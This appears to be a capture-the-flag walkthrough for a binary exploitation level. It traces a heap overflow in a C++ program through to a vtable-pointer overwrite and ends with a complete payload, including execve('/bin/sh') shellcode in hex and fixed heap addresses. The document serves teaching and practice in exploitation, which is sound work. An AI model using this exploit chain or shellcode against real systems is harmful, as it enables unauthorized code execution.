================================= LEVEL 9 WALKTHROUGH =========================================

--- Protections ---

No RELRO, no canary, NX disabled, no PIE, no ASLR
→ shellcode injection possible, addresses fixed and predictable

--- What the program does ---

main() creates two C++ objects:
   N *a = new N(5);
   N *b = new N(6);

Each object is 108 bytes (0x6c), confirmed via:
   movl $0x6c,(%esp)   before each "operator new" call

a->setAnnotation(argv[1]) is called, then:
   return (b->*(b->func))(*a);
   → reads a function pointer stored inside b, and calls it

--- Finding the vulnerability ---

disas N::setAnnotation showed:
   call strlen(argv[1])
   call memcpy(this+4, argv[1], strlen(argv[1]))

→ memcpy with NO size limit, size fully controlled by attacker's input length
→ classic heap overflow, same family as level6/7/8

--- Confirming a real vtable is involved ---

Checked what main reads before calling the function:
   mov (%eax),%eax   ← object → some pointer
   mov (%eax),%edx     ← that pointer → another pointer
   call *%edx           ← call it

Confirmed in GDB by inspecting memory at offset 0 of an object:
   x/s 0x08048848 → "_ZTV1N+8" (mangled name = "Virtual Table for N")

→ this proves offset 0 of the object is a real C++ vtable pointer,
  not a plain function pointer or integer — TWO dereferences are required
  to reach the actual function address, exactly matching the assembly.

--- Why two dereferences matter for the exploit ---

Normal flow:        object → vtable pointer → function pointer in vtable → call
Our goal:            object → OUR address  → ANOTHER address we control  → shellcode

So our exploit needs to write a small "pointer chain" into memory:
   address_1 (overwrites object b's vtable pointer)
   → contains address_2
   → address_2 contains the shellcode itself

--- Finding the buffer's address (where our payload physically lands) ---

Set a breakpoint right after setAnnotation() returns and checked the
register holding the buffer's location:
   break *0x08048664
   run AAAA
   x/4xw $eax
   → showed our payload living at 0x0804a00c

This is the heap address where our input (the payload we send as argv[1])
actually gets stored — confirmed live, not assumed.

--- Finding the offset (how many bytes to reach b's vtable pointer) ---

Object a is 108 bytes total. Object b is allocated right after it on the
heap (same size, sequential allocation, confirmed by both objects'
addresses being exactly 108 bytes apart when checked in GDB).

setAnnotation writes starting at a+4 (skipping a's own vtable pointer).
So filling exactly 104 bytes from that point reaches the start of b
(b's vtable pointer, offset 0 of b) — but the community-tested working
payload uses 108 total bytes of content before the final overwrite,
because it counts shell_addr(4) + shellcode(28) + padding(76) = 108,
landing the FINAL 4-byte address exactly on b's vtable pointer.

Padding size, explained:
   total content needed before the final overwrite: 108 bytes
   shell_addr:   4 bytes
   shellcode:   28 bytes
   ---------------------
   already used: 32 bytes
   padding needed: 108 - 32 = 76 bytes  ← this is where "76" comes from

--- The payload ---

[ shell_addr (4b) ][ shellcode (28b) ][ padding "A"*76 ][ buffer_addr (4b) ]

shell_addr  = \x10\xa0\x04\x08   → 0x0804a010 (where shellcode will actually sit)
shellcode   = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3
              \x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
              → execve("/bin/sh") machine code (28 bytes)
padding     = "A" * 76            → fills remaining space up to offset 108
buffer_addr = \x0c\xa0\x04\x08    → 0x0804a00c (overwrites b's vtable pointer)

Why buffer_addr is exactly 0x0804a00c and shell_addr is 0x0804a010:
   our payload is written starting at 0x0804a00c (confirmed above)
   0x0804a00c + 4 bytes = 0x0804a010 → exactly where shellcode begins
   (the first 4 bytes of our own payload ARE the shell_addr value,
    so shellcode naturally starts 4 bytes later, at +4)

--- The pointer chain, fully traced ---

1. memcpy overflows a's buffer, overwrites b's vtable pointer with 0x0804a00c

2. main resumes and executes:
   eax = b
   eax = *b = 0x0804a00c          ← 1st dereference: reads OUR overwrite
   edx = *(0x0804a00c) = 0x0804a010  ← 2nd dereference: reads the value
                                        WE stored at the very start of
                                        our own payload (shell_addr)
   call *edx → call 0x0804a010 → jumps straight into our shellcode

3. shellcode executes execve("/bin/sh") → shell opens

